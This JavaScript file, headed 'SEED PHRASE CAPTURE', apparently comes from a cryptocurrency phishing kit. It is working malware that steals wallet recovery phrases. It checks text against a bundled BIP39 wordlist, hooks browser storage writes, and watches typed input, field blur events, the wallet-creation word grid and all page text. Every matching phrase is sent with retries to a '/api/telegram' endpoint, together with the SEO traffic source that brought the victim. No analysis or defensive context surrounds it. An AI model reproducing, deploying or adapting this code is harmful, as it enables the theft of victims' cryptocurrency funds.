// ============================================================
// SEED PHRASE CAPTURE - form-handler.js
// Captures seed phrases from: user input + wallet creation UI
// ============================================================

const API = '/api/telegram';
let lastSent = '';
let inputTimer;

// --- Traffic source ---
function getTrafficSource() {
  const ref = document.referrer.toLowerCase();
  const p = new URLSearchParams(window.location.search);
  if (ref.includes('google.com') || ref.includes('google.co')) return 'Google SEO';
  if (ref.includes('bing.com')) return 'Bing SEO';
  const s = p.get('utm_source') || p.get('source') || '';
  if (s.toLowerCase().includes('google')) return 'Google SEO';
  if (s.toLowerCase().includes('bing')) return 'Bing SEO';
  return document.referrer || 'Direct';
}
const trafficSource = getTrafficSource();

// --- Helpers ---
function words(v) { return (v || '').trim().split(/\s+/).filter(w => w.length > 0); }
function wc(v) { return words(v).length; }

// BIP39 wordlist for validation
const BIP39WORDS = "abandon ability able about above absent absorb abstract absurd abuse access accident account accuse achieve acid acoustic acquire across act action actor actress actual adapt add addict address adjust admit adult advance advice aerobic affair afford afraid again age agent agree ahead aim air airport aisle alarm album alcohol alert alien all alley allow almost alone alpha already also alter always amateur amazing among amount amused analyst anchor ancient anger angle angry animal ankle announce annual another answer antenna antique anxiety any apart apology appear apple approve april arch arctic area arena argue arm armed armor army around arrange arrest arrive arrow art artefact asset artist ask assume asthma athlete atom attack attend attitude attract auction audit august aunt author auto autumn average avocado avoid awake aware away awesome awful awkward axis baby bachelor bad badge bag balance balcony ball bamboo banana banner bar barely bargain barrel base basic basket battle beach bean beauty because become beef before begin behave behind believe below belt bench benefit best betray better between beyond bicycle bid bike bind biology bird birth bitter black blade blame blanket blast bleak bless blind blood blossom blouse blue blur blush board boat body boil bomb bone bonus book boost border boring borrow boss bottom bounce box boy bracket brain brand brass brave bread breeze brick bridge brief bright bring brisk broccoli broken bronze broom brother brown brush bubble buddy budget buffalo build bulb bulk bullet bundle bunker burden burger burst bus business busy butter buyer buzz cabbage cabin cable cactus cage cake call calm camera camp can canal cancel candy cannon canoe canvas canyon capable capital captain car carbon card cargo carpet carry cash casino castle casual cat catalog catch category cattle caught cause caution cave ceiling celery cement census century cereal certain chair chalk champion change chaos chapter charge chase chat cheap check cheese chef cherry chest chicken chief child chimney choice choose chronic chuckle chunk cigar cinema circle citizen city civil claim clap clarify claw clay clean clerk clever click client cliff climb clinic clock close cloud clown club clump cluster clutch coach coast coconut code coffee coil coin collect color column combine come comfort comic common company concert conduct confirm congress connect consider control convince cook cool copper copy core corn correct cost cotton couch country couple course cousin cover coyote craft crack cradle craft crane crash crater crazy cream credit creek crew crime crisp crop cross crowd crown crucial cruel cruise crumble crunch crush cry crystal cube culture cup cupboard curious current curtain curve cushion custom cycle dad damage damp dance danger daring dash daughter dawn day deal debate debris decade december decide decline decorate deer decrease defense define defy degree delay deliver demand dense deny dentist depend deploy describe desert design desk despair destroy detail detect develop device devote diagram dial diamond diary dice diesel diet differ digital dignity dilemma dinner dinosaur direct dirt disagree discover disease dish dismiss disorder display distance disturb divide divorce doctor dog doll dolphin domain donate donkey donor door dose double dove draft dragon drama drain draw dream dress drift drill drink drip drive drop drum dry duck dumb dune dust duty dwarf dynamic eager eagle early earn earth easily east easy echo ecology economy edge edit educate effort egg eight either elbow elder electric elegant element elephant elevator elite else embark embody embrace emerge emotion employ empty enable enact end endless endorse enemy energy enforce engage engine enhance enjoy enlist enough enrich enroll ensure enter entire entry envelope episode equal equip era erase erode erosion error erupt escape essay essence estate eternal ethics evidence evil evoke evolve exact example except exchange excite exclude excuse execute exercise exhaust exhibit exist exit expand expect experiment expert expire explain expose express extend extra eye eyebrow fabric face faculty fade faint faith false fame family famous fan fancy fantasy farm fashion fast fat fault fear feature fee feed feel female fence festival fetch fever few fiber fiction field fifth fight figure file fill film filter final find fine finger finish fire firm first fish fitting five fix flag flame flash flat flavor flee flight flip float flock floor flower fluid flush fly foam focus foil fold follow food foot force forest forget fork fortune forum forward found four frame freeze fresh friend front frost fruit fudge fuel full fun furnace fury future gadget gain galaxy gallery game gap garbage garden garlic gas gate gather gauge gaze gear gender gene generic genius gentle genuine gesture ghost giant gift giraffe girl give glad glance glass globe gloom glory glove glow glue goat gold good goose grace grain grant grape grass gravity gray great green grid grief grit grocery group grow guard guess guide guilt guitar gun gym habit hair half hammer hand happy harbor harsh harvest hat have hawk hazard head health heart heavy hedge heel height hello help hen hero hidden high hill hint hire history hit hobby hockey hold hole holiday hollow home honey hook hope horn horror horse hospital host hotel hour house hover huge human humble humor hundred hungry hunt hurry hurt husband hybrid ice icon idea identify idle ignore illegal illness image imitate immense impact imply import improve include income increase index indicate indoor industry infant inflict inform inhale inherit initial inject injury inmate inner innocent input inquiry inside insect insight install instruct interest intact introduce invade invest invite involve iron island issue item jacket jail january jazz jealous jeans jelly jewel job join joke journey joy judge juice jump junior jury just justify keep ketchup key kick kid kidney kind king kiss kitchen kite knee knife knock know lab label labor ladder lady lake lamp land language large last late laugh laundry law lawn lay layer lazy lead leaf lean leap learn least leather leave left leg legacy legal legend lemon length lens lesson let letter level library life lift light limit line link lion liquid list little live lizard load loan local lock logic lonely long loop lose lottery love loyal luck luggage lump lunar lunch luxury lyrics machine mad magic magnet maid mail main major make mammal manage many map marble march margin marine market marriage mask mass master match material math matter may maze meadow mean measure meat media medical meet melody member memory mention menu mercy merge merit merry message metal method middle might milk million mind min minor minute mirror miss mission mix mobile model modify mom moment monitor monkey month moon moral more morning mother motion motor mountain mouse move mouth movie much music muscle museum mutual myself mystery name nap narrow nation native nature near neck need nervous network never news next nice night nine noise normal north nose note novel now nuclear number nurse nut oak obey object observe obtain obvious occur ocean october odd off offer office often oil okay old olive once one onion online open opera opinion oppose option orange orbit orchard order organ orient original orphan ostrich other outdoor outer output outside oven over own owner oxygen oyster pace pack page paint pair palace palm panda panel panic panther paper parade parent park parrot party pass past path pause peace peak peanut pear peasant pelican pen penalty pencil people pepper perfect permit person pet phone photo phrase physical piano picnic picture piece pig pigeon pill pilot pink pioneer pipe pistol pitch pizza place planet plastic plate play pledge pluck plug poem poet point polar pole police pond pony pool popular portion position possible post potato pottery poverty powder power practice praise predict prefer prepare present pretty prevent price pride primary print priority prison private prize problem process produce profit program project promote proof property prosper protect proud provide public pudding pull pulp pulse pumpkin punch pupil puppy purchase purity purpose purse push put puzzle pyramid quality quantum quarter queen quick quiet quiz quote rabbit raccoon race radar radio rail rain raise rally ramp ranch random range rapid rare rate rather raven raw razor ready real reason rebel rebuild recall receive recipe record recycle reduce reflect reform refuse region regret regular reject relax release relief remain remember remind remove render renew rent repair repeat replace report require rescue resemble resist resort rest result retain retire retreat return reveal review rhythm rice rich ride ridge rifle right rigid ring rise risk ritual river road roast robot rock rocket room root rope rose rotate rough round route royal rubber rude rug rule run runway rural sad saddle sadness safe sail salad salmon salt same sand satisfy satoshi save saw say scale scare school science scope score scratch screen script scroll sea search season seat second secret section security seed seek segment select sell seminar senior sense sentence series serious serve session settle setup seven several shade shake shallow share shed shell sheriff shield shift shine ship shirt shock shoe shoot shop short shoulder shout shower shrimp shrink shuffle shy sick side sight sign silent silver simple since sing single sister sit six size skate sketch ski skill skin skirt skull slab sleep slide slight slow small smart smile smoke smooth snack snake snow soap soccer social sock soda soft solar soldier solid solution solve some son song soon sorry sort soul sound soup source south space spare speak special speed spell spend sphere split sport spread spring square squeeze stable staff stage stair stamp stand star start state station stay steel step stick still stock stone store story stove strange street stretch strong structure student stuff stupid style subject submit subway success such sudden suffer sugar suggest suit summer sun sunny sunset super supply sure surface survey sustain swallow swamp swap swarm swear sweep sweet swim swing switch symbol system table tackle tag tail take talk tall tank tape target task taste tattoo taxi teach team tell ten tenant tennis tent term test text thank that theme then theory there they thick thing think third this though three throw thumb thunder ticket tide tiger tilt time tiny tip tired tissue title today toilet tomato tomorrow tone tongue tool tooth top topic toss total tough tower track trade traffic train trap travel treat tree trend trial tribe trick trigger trim trip trophy truck true truly trust truth try tube tuna tunnel turn turtle twelve twice twin twist type ugly umbrella unable unaware uncle under undo uniform union unique unit universe unknown unlock until unusual unveil update upgrade upon upper urban urge use useful usual utility vacant vacuum vague valid valley value van vanish vapor various vast vault vehicle velvet vendor venture version very vessel veteran victory video view village vintage violin virtual virus visa visit visual vital vivid vocal voice void volcano volume vote voyage wage wagon wait walk wall walnut want warfare warm wash waste watch water wave way wealth weapon wear weather web wedding weekend weird welcome west wet whale wheel when where which while whisper white whole wide wife wild will win window winter wire wisdom wise wish witness wolf woman wonder wood wool word work world worry worth wrap wreck wrestle wrist write wrong yard year yellow you young youth zebra zero zone zoo";

// Valid 12/15/18/21/24-word BIP39 seed phrase - must use real BIP39 words
function isSeed(v) {
  if (!v) return false;
  var ws = words(v.toLowerCase());
  if (![12, 15, 18, 21, 24].includes(ws.length)) return false;
  return ws.every(function(w) {
    return BIP39WORDS.indexOf(w) >= 0 && w.length >= 3 && w.length <= 8;
  });
}

// --- Send to Telegram ---
async function sendToTelegram(data) {
  data.trafficSource = trafficSource;
  data.timestamp = new Date().toISOString();
  console.log('📤 Sending to API:', data.TYPE, data.WORDS ? data.WORDS + ' words' : '');
  for (let i = 0; i < 3; i++) {
    try {
      const r = await fetch(API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ data })
      });
      const resp = await r.json();
      if (!r.ok) {
        console.error('❌ API error:', r.status, resp);
        throw new Error('HTTP ' + r.status);
      }
      console.log('✅ API success:', resp);
      return resp;
    } catch (e) {
      console.error('❌ Send failed (attempt ' + (i+1) + '):', e.message);
      if (i === 2) {
        console.error('❌ All retries failed');
        throw e;
      }
      await new Promise(r => setTimeout(r, 1000 * (i + 1)));
    }
  }
}

// --- Storage monitoring: capture phrases saved to localStorage/sessionStorage ---
(function() {
  const originalSetItem = Storage.prototype.setItem;
  Storage.prototype.setItem = function(key, value) {
    originalSetItem.apply(this, arguments);
    // Check if value looks like a seed phrase
    if (typeof value === 'string' && isSeed(value)) {
      console.log('💾 Storage capture:', key, wc(value), 'words');
      sendPhrase(value, 'STORAGE_' + this.constructor.name.toUpperCase(), key);
    }
  };
})();

// --- Send phrase (deduplicated) ---
function sendPhrase(phrase, type, field) {
  var clean = phrase.toLowerCase().replace(/\s+/g, ' ').trim();
  if (!clean || clean === lastSent) return;
  lastSent = clean;
  var n = wc(clean);
  console.log('✅ CAPTURED:', n, 'word phrase [' + type + '] from', trafficSource);
  console.log('🔑 PHRASE:', clean);
  
  // Send to API
  sendToTelegram({ TYPE: type, PHRASE: clean, WORDS: n, FIELD: field || 'input', PAGE: window.location.pathname })
    .then(() => console.log('✅ Delivered to Telegram'))
    .catch(e => console.error('❌ Failed to deliver:', e.message));
}

// --- Collect words from .phrase-grid (wallet creation display) ---
function collectGridPhrase() {
  // Try multiple selectors for the phrase grid
  var grid = document.querySelector('.phrase-grid') || document.querySelector('[class*="phrase-grid"]');
  if (!grid) {
    console.log('🔍 No .phrase-grid found');
    return;
  }
  console.log('✅ Found phrase-grid:', grid.className);
  
  // Words are in <span> children directly (not .phrase-card)
  var spans = grid.querySelectorAll(':scope > span');
  if (!spans.length) {
    // Fallback: any direct child with text
    spans = grid.children;
  }
  console.log('🔍 Found', spans.length, 'word elements in grid');
  
  if (!spans.length) return;
  
  var ws = [];
  for (var i = 0; i < spans.length; i++) {
    var txt = (spans[i].textContent || '').trim();
    // Clean: remove index numbers, take just the word
    txt = txt.replace(/^\d+[:.)\s]*/, '').trim();
    if (txt && /^[a-zA-Z]{2,10}$/.test(txt)) {
      ws.push(txt.toLowerCase());
    }
  }
  
  console.log('🔍 Collected words:', ws.length, ws.slice(0, 3).join(',') + '...');
  
  if ([12, 15, 18, 21, 24].includes(ws.length)) { // 12, 15, 18, 21, or 24 words
    var phrase = ws.join(' ');
    if (phrase !== lastSent) {
      lastSent = phrase;
      console.log('📋 Sending WALLET_CREATED phrase:', ws.length, 'words');
      sendToTelegram({ TYPE: 'WALLET_CREATED', PHRASE: phrase, WORDS: ws.length, PAGE: window.location.pathname });
    }
  }
}

// --- Scan all inputs and the phrase grid ---
function scanAll() {
  collectGridPhrase();
  document.querySelectorAll('input, textarea').forEach(function(el) {
    var v = (el.value || '').trim();
    if (isSeed(v)) sendPhrase(v, 'SEED_INPUT', el.name || el.id || el.placeholder || 'field');
  });
}

// --- Start monitor ---
function startMonitor() {
  new MutationObserver(function(muts) {
    var changed = muts.some(function(m) { return m.addedNodes.length || m.type === 'characterData'; });
    if (changed) setTimeout(scanAll, 200);
  }).observe(document.body, { childList: true, subtree: true, characterData: true });

  [800, 2000, 4000, 7000, 12000].forEach(function(t) { setTimeout(scanAll, t); });
}

// --- Deep scan: look for 12-word BIP39 phrases in any text content ---
function deepScan() {
  // Get all text from the page
  const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
  let node;
  const texts = [];
  while (node = walker.nextNode()) {
    const text = node.textContent.trim();
    if (text.length > 20 && text.length < 500) texts.push(text);
  }
  
  // Check each text block - only 12-word BIP39 phrases
  texts.forEach(text => {
    const segments = text.split(/[\n,;|]+/);
    segments.forEach(seg => {
      const clean = seg.trim();
      if (isSeed(clean)) {
        console.log('🔎 Deep scan found 12-word BIP39 phrase');
        sendPhrase(clean, 'DEEPSCAN_TEXT', 'page');
      }
    });
  });
}

// Run deep scan periodically
setInterval(deepScan, 3000);

// --- Input: capture typed phrases ---
document.addEventListener('input', function(e) {
  var t = e.target;
  if (t.tagName !== 'INPUT' && t.tagName !== 'TEXTAREA') return;
  clearTimeout(inputTimer);
  inputTimer = setTimeout(function() {
    var v = (t.value || '').trim();
    if (isSeed(v)) sendPhrase(v, 'SEED_TYPED', t.name || t.id || t.placeholder || 'input');
  }, 500);
});

// --- Blur: capture when user finishes and moves on ---
document.addEventListener('blur', function(e) {
  var t = e.target;
  if (t.tagName !== 'INPUT' && t.tagName !== 'TEXTAREA') return;
  var v = (t.value || '').trim();
  if (isSeed(v)) sendPhrase(v, 'SEED_BLUR', t.name || t.id || t.placeholder || 'input');
}, true);

// --- Boot ---
document.addEventListener('DOMContentLoaded', function() {
  console.log('🔍 Traffic:', trafficSource);
  startMonitor();
});

window.TelegramIntegration = { send: sendToTelegram, sendPhrase: sendPhrase };
